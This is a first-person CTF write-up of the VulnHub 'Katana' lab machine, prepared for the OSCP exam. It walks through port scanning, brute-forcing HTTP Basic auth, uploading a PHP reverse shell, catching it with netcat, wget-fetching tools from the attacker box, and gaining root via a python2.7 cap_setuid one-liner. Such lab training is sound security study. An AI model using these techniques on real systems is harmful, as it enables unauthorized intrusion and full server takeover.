# OSCP Prep - *Katana*

## Objective

I must go from visiting a simple website to having root access over the entire web server to obtain the flag in /root.

I downloaded the VM from [here](https://www.vulnhub.com/entry/katana-1,482/) and set it up with VMware Workstation Pro 16.

## Step 1 & 2 - Reconnaissance & Exploitation

First I find my IP address and run an Nmap scan to identify the target.

```
$ sudo ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.57.129  netmask 255.255.255.0  broadcast 192.168.57.255
        inet6 fe80::1e91:80ff:fedf:813a  prefixlen 64  scopeid 0x20<link>
        ether 1c:91:80:df:81:3a  txqueuelen 1000  (Ethernet)
        RX packets 885  bytes 363744 (355.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 832  bytes 230786 (225.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
```
$ sudo nmap -sn -T4 -n 192.168.57.1/24

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:17 EDT
Nmap scan report for 192.168.57.1
Host is up (0.00065s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.57.2
Host is up (0.00021s latency).
MAC Address: 00:50:56:F4:F8:FC (VMware)
Nmap scan report for 192.168.57.140
Host is up (0.000084s latency).
MAC Address: 00:0C:29:DF:AA:E9 (VMware)
Nmap scan report for 192.168.57.254
Host is up (0.00024s latency).
MAC Address: 00:50:56:FB:7F:30 (VMware)
Nmap scan report for 192.168.57.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.98 seconds
```

The target machine is at IP address ```192.168.57.140```, so I run a detailed Nmap scan on it.

```
$ sudo nmap -sS -Pn -n -T4 -f -p- 192.168.57.140

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:20 EDT
Nmap scan report for 192.168.57.140
Host is up (0.000094s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7080/tcp open  empowerid
8088/tcp open  radan-http
8715/tcp open  unknown
MAC Address: 00:0C:29:DF:AA:E9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.23 seconds
```

Ports 80, 7080, 8088, and 8715 all sound like ports for a web server, so I do some more enumeration with NSE scripts on them.

```
$ sudo nmap -sS -sC -A -T4 -v -Pn -n -p 80,7080,8088,8715 --script http-enum.nse,http-title.nse,http-headers.nse,http-methods.nse,http-auth.nse 192.168.57.140 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:40 EDT
NSE: Loaded 50 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
Initiating ARP Ping Scan at 11:40
Scanning 192.168.57.140 [1 port]
Completed ARP Ping Scan at 11:40, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:40
Scanning 192.168.57.140 [4 ports]
Discovered open port 80/tcp on 192.168.57.140
Discovered open port 7080/tcp on 192.168.57.140
Discovered open port 8088/tcp on 192.168.57.140
Discovered open port 8715/tcp on 192.168.57.140
Completed SYN Stealth Scan at 11:40, 0.03s elapsed (4 total ports)
Initiating Service scan at 11:40
Scanning 4 services on 192.168.57.140
Completed Service scan at 11:41, 22.08s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.57.140
NSE: Script scanning 192.168.57.140.
Initiating NSE at 11:41
Completed NSE at 11:42, 75.82s elapsed
Initiating NSE at 11:42
Completed NSE at 11:42, 0.09s elapsed
Nmap scan report for 192.168.57.140
Host is up (0.00038s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Katana X
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
| http-headers: 
|   Date: Mon, 18 Jul 2022 15:41:06 GMT
|   Server: Apache/2.4.38 (Debian)
|   Last-Modified: Mon, 11 May 2020 16:25:07 GMT
|   ETag: "28f-5a561ca401471"
|   Accept-Ranges: bytes
|   Content-Length: 655
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
7080/tcp open  ssl/http LiteSpeed httpd
|_http-server-header: LiteSpeed
| http-headers: 
|   X-Powered-By: PHP/5.6.36
|   Content-Type: text/html; charset=UTF-8
|   Date: Mon, 18 Jul 2022 15:41:06 GMT
|   Server: LiteSpeed
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-title: Katana X
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8088/tcp open  http     LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Katana X
| http-headers: 
|   Etag: "28f-5eb97c92-c08a6;;;"
|   Last-Modified: Mon, 11 May 2020 16:25:54 GMT
|   Content-Type: text/html
|   Content-Length: 655
|   Accept-Ranges: bytes
|   Date: Mon, 18 Jul 2022 15:41:06 GMT
|   Server: LiteSpeed
|   Connection: close
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-enum: 
|_  /phpinfo.php: Possible information file
8715/tcp open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Authorization Required
| http-headers: 
|   Server: nginx/1.14.2
|   Date: Mon, 18 Jul 2022 15:41:06 GMT
|   Content-Type: text/html
|   Content-Length: 195
|   Connection: close
|   WWW-Authenticate: Basic realm="Restricted Content"
|   
|_  (Request type: GET)
MAC Address: 00:0C:29:DF:AA:E9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Uptime guess: 40.639 days (since Tue Jun  7 20:22:02 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.57.140

NSE: Script Post-scanning.
Initiating NSE at 11:42
Completed NSE at 11:42, 0.00s elapsed
Initiating NSE at 11:42
Completed NSE at 11:42, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.80 seconds
           Raw packets sent: 27 (1.982KB) | Rcvd: 19 (1.454KB)
```

So there's a couple of things learned so far.

- This machine is running three different web server applications, Apache, LiteSpeed, and Nginx.
- There is a ```/phpinfo.php``` file present, meaning this site is running PHP.
- ```192.168.57.140:8715``` requires credentials for access.
- ```192.168.57.140:7080``` uses HTTPS instead of HTTP.

I use Nmap to brute force those HTTP credentials.

```
$ sudo nmap -sV -p 8715 --script http-brute.nse 192.168.57.140

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:46 EDT
Nmap scan report for 192.168.57.140
Host is up (0.00032s latency).

PORT     STATE SERVICE VERSION
8715/tcp open  http    nginx 1.14.2
| http-brute: 
|   Accounts: 
|     admin:admin - Valid credentials
|_  Statistics: Performed 45009 guesses in 14 seconds, average tps: 3214.9
|_http-server-header: nginx/1.14.2
MAC Address: 00:0C:29:DF:AA:E9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.77 seconds
```

I got the credentials for ```http://192.168.57.140:8715``` to be ```admin:admin``` and I'll save them for later.

Next I ran some Nikto and Gobuster scans for some directory enumeration. Nikto had nothing much of interest, but Gobuster revealed a lot of stuff.

A scan on port 80 revealed a CSE bookstore, but after digging through it and trying to run some authenticated file uploading exploits, it was clear that it was a red herring.

For such file upload exploits to work, the crucially necessary ```edit_book.php``` file was needed -- and in this case was nonexistent, almost as if the CTF developer expected people to go for it.

Other Gobuster scans revealed a few ```.php``` and ```.html``` files on port 8088.

```
$ sudo gobuster fuzz -u http://192.168.57.140:8088/FUZZ -w seclists/Discovery/Web-Content/raft-large-files.txt -b 403,404

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.57.140:8088/FUZZ
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                seclists/Discovery/Web-Content/raft-large-files.txt
[+] Excluded Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/18 11:54:43 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=655] http://192.168.57.140:8088/index.html
Found: [Status=301] [Length=1260] http://192.168.57.140:8088/.        
Found: [Status=200] [Length=50739] http://192.168.57.140:8088/phpinfo.php
Found: [Status=200] [Length=1800] http://192.168.57.140:8088/upload.php  
Found: [Status=200] [Length=195] http://192.168.57.140:8088/error404.html
Found: [Status=200] [Length=6480] http://192.168.57.140:8088/upload.html 
                                                                         
===============================================================
2022/07/18 11:54:47 Finished
===============================================================
```

Investigations of the ```upload.html``` page revealed a file uploading feature, with seemingly no restrictions on what could be uploaded.

![image](https://user-images.githubusercontent.com/45502375/179552793-e7e06f52-73f6-4372-b685-50a1fe87da05.png)

So I did the obvious thing and uploaded a PHP reverse shell script. It worked and even gave me the absolute path to the file of ```/opt/manager/html/katana_catshell.php```, although I didn't exactly know where this was yet.

![image](https://user-images.githubusercontent.com/45502375/179553046-3bd2e765-536d-464a-b876-0c10ca767c0c.png)

However, given that the folder my reverse shell was in was called ```html```, I assumed it was on one of the other webpages, and I had a feeling I knew which one it was.

To be thorough, I ran another Gobuster scan on port 8088 for directories too and it revealed a ```/protected/``` folder.

```
$ sudo gobuster fuzz -u http://192.168.57.140:8088/FUZZ/ -w seclists/Discovery/Web-Content/raft-large-words.txt -b 404,403

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.57.140:8088/FUZZ/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                seclists/Discovery/Web-Content/raft-large-words.txt
[+] Excluded Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/18 12:05:03 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=5472] http://192.168.57.140:8088/docs/
Found: [Status=200] [Length=655] http://192.168.57.140:8088/./    
Found: [Status=401] [Length=1242] http://192.168.57.140:8088/protected/
                                                                       
===============================================================
2022/07/18 12:05:15 Finished
===============================================================
```

Using Burp Suite, I captured the GET request to access the directory and tried the credentials ```admin:admin``` again, but they didn't seem to work.

```
GET /protected/ HTTP/1.1
Host: 192.168.57.140:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46YWRtaW4=
```

HTTP Basic Authentication takes credentials in a ```user:pass``` format and Base64 encodes them in the GET request, so I tried the following.

- I sent the request to the Intruder and set payload positioners around ```YWRtaW46YWRtaW4=```, the credentials in the ```Authorization``` header.

![image](https://user-images.githubusercontent.com/45502375/179562052-eeaba28b-ff92-42c4-9357-804f26454c42.png)

- I set up a Simple list payload with common passwords from various wordlists to be used.

![image](https://user-images.githubusercontent.com/45502375/179562188-bd23d75a-d328-4759-90d0-9023fb26e638.png)

- I added a modifier to add an ```admin:``` prefix, since the list was only providing passwords, and then added a Base64-encoding modifier as well.

![image](https://user-images.githubusercontent.com/45502375/179562294-61df063a-5d36-4f1f-9128-0903d756d8ca.png)

With this, I tried brute-forcing the login for a couple of minutes, to no avail...

![image](https://user-images.githubusercontent.com/45502375/179562507-1e9e3369-22a5-49a5-a78f-1b458b296e1b.png)

So I moved on from this folder and went to the other password-protected site instead: ```http://192.168.57.140:8715```.

There was no brute-forcing required, since that was handled beforehand in the Nmap scanning and determined to be ```admin:admin```.

Logging in didn't reveal much, and neither did a Gobuster or Nikto scan of this page.

I tried accessing my reverse shell script, since the previously mentioned ```upload.html``` page indicated the file was in another ```/html/``` folder, and given that its parent directory is ```/manager/```, I had hoped that such a "manager" would be behind an authentication wall.

To my surprise, this worked.

Going to ```http://192.168.57.140:8715/katana_catshell.php``` revealed the following:

![image](https://user-images.githubusercontent.com/45502375/179563259-d17a0562-4f67-4952-b004-fbe2fbc9810d.png)

So I tried again, this time with a Netcat listener running on port 4444, and I was able to gain access to the target.

```
$ sudo nc -lvnp 4444

listening on [any] 4444 ...
connect to [192.168.57.129] from (UNKNOWN) [192.168.57.140] 53810
Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 12:59:07 up  2:13,  0 users,  load average: 0.04, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
## Step 3 - Privilege Escalation

Now that I had a foothold in the server, I could focus on upgrading to root.

I upgraded to a TTY shell.

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@katana:/$ ^Z
zsh: suspended  sudo nc -lvnp 4444

┌──(meowmycks㉿catBook-Air)-[~]
└─$ stty raw -echo;fg  
[1]  + continued  sudo nc -lvnp 4444

www-data@katana:/$ export TERM=xterm
www-data@katana:/$
```

I went to the ```/tmp``` folder to download enumeration scripts that would give me some insight into how I could perform privilege escalation on the target.

```
www-data@katana:/$ cd tmp
www-data@katana:/tmp$
```

I started an HTTP server on my Kali box with Python using the command ```sudo python3 -m http.server 80```, allowing me to download my scripts from the target machine using ```wget``` requests.

```
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I then downloaded a local copy of Linux Smart Enumeration (LSE) onto the target machine.

LSE allows me to scan the host for common privilege escalation points and some additional known vulnerabilities.

Kali
```
192.168.57.140 - - [18/Jul/2022 13:05:45] "GET /lse.tar HTTP/1.1" 200 -
```
Target:
```
www-data@katana:/tmp$ wget http://192.168.57.129/lse.tar

wget http://192.168.57.129/lse.tar
--2022-07-18 13:05:45--  http://192.168.57.129/lse.tar
Connecting to 192.168.57.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24565760 (23M) [application/x-tar]
Saving to: ‘lse.tar’

lse.tar             100%[===================>]  23.43M  47.8MB/s    in 0.5s    

2022-07-18 13:05:46 (47.8 MB/s) - ‘lse.tar’ saved [24565760/24565760]

www-data@katana:/tmp$
```

Running the script presented hashes in the ```/etc/passwd``` file for users ```root``` and ```katana```.

They were Unix SHA-512 hashes, indicated by the ```$6$``` prefixes, but I wasn't about to spend half an hour messing with them in hashcat just yet.

Some other interesting things noticed were binaries with the SETUID bit, cron jobs, and binaries with capabilities, among other things.

More crucially, there was a privilege escalation opportunity present in the binaries with capabilities.

```
www-data@katana:/tmp/lse$ getcap -r / 2>/dev/null

getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
```

The application ```/usr/bin/python2.7``` had ```+ep``` capabilities, which would allow the privilege escalation to take place.

Using GTFOBins' documentation found [here](https://gtfobins.github.io/gtfobins/python/#capabilities), we can use the following payload to elevate to a root shell.

![image](https://user-images.githubusercontent.com/45502375/179566709-008c67d7-0c3b-41e2-a8d6-2248e747122c.png)

So I performed the privilege escalation and was able to become root.

```
www-data@katana:/tmp/lse$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
whoami
root
#
```

I then went to ```/root``` and obtained the flag.

```
# cd /root
cd /root
# ls         
ls
root.txt
# cat root.txt
cat root.txt
{R00t_key_Katana_91!}
#
```

## Conclusion

This one was more difficult than the others I've experienced, which is probably a good thing. Becoming more prepared entails tackling harder challenges.

The presence of several different web servers threw me off and I was stuck on the initial "CSE Bookstore" and "/protected/ folder" rabbit holes for a while, but I was inevitably able to overcome them.

Here's expecting I can use these learning experiences well in the future.
